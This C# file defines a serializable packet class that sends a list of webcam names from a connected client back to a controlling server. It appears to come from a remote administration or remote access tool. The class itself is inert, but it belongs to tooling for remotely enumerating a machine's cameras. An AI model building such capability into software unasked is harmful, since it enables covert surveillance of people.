using System;
using System.Collections.Generic;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetWebcamsResponse : IPacket
    {
        public List<string> Names { get; set; }

        public GetWebcamsResponse()
        {
        }

        public GetWebcamsResponse(List<string> names)
        {
            this.Names = names;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}